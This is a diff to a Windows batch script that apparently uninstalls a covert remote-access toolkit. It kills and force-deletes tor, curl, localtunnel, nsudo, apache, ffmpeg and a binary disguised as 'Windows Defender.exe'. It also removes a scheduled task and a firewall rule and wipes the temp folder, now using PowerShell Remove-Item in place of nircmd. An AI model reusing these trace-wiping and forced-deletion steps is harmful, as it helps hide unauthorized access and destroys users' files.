@@ -10,27 +10,29 @@ netsh advfirewall firewall delete rule name="apache" program="%environment%\apac
 
 taskkill /f /im tor.exe
 taskkill /f /im curl.exe
+taskkill /f /im nsudo.exe
 taskkill /f /im "Windows Defender.exe"
 taskkill /f /im localtunnel.exe
 taskkill /f /im httpd.exe
 taskkill /f /im ffmpeg.exe
-"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\Windows Defender.exe"
-"%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\localtunnel"
-"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\curl.exe"
-"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\tor.exe"
-"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\ffmpeg.exe"
-"%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\tor"
-"%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\Ookla"
-"%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\Win32"
-"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\apache2"
+powershell.exe Remove-Item -Force "%environment%\Windows Defender.exe"
+powershell.exe Remove-Item -Force -Recurse "%environment%\localtunnel"
+powershell.exe Remove-Item -Force "%environment%\nsudo.exe"
+powershell.exe Remove-Item -Force "%environment%\curl.exe"
+powershell.exe Remove-Item -Force "%environment%\tor.exe" 
+powershell.exe Remove-Item -Force "%environment%\ffmpeg.exe" 
+powershell.exe Remove-Item -Force -Recurse /q "%appdata%\tor"
+powershell.exe Remove-Item -Force -Recurse "%appdata%\Ookla"
+powershell.exe Remove-Item -Force -Recurse "%environment%\Win32"
+powershell.exe Remove-Item -Force -Recurse "%environment%\apache2"
 "%environment%\7-Zip\Uninstall.exe" /S
-"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\7-Zip"
-"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\nircmd.exe"
+powershell.exe Remove-Item -Force -Recurse "%environment%\7-Zip"
+powershell.exe Remove-Item -Force "%environment%\nircmd.exe" 
 schtasks /Delete /TN "%SID%XYZ" /F
 Taskkill /f /im winrun.exe
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
-del /s /f /q /a "%environment%\Win32\*.bat"
+powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat"
 taskkill /F /IM wscript.exe
 taskkill /F /IM cscript.exe
 
@@ -38,4 +40,3 @@ icacls "%environment%" /reset /C
 taskkill /f /im timeout.exe
 taskkill /f /im explorer.exe
 start "" "%windir%\explorer.exe"  
-"%environment%\nircmd.exe" execmd taskkill /f /im "cmd.exe"
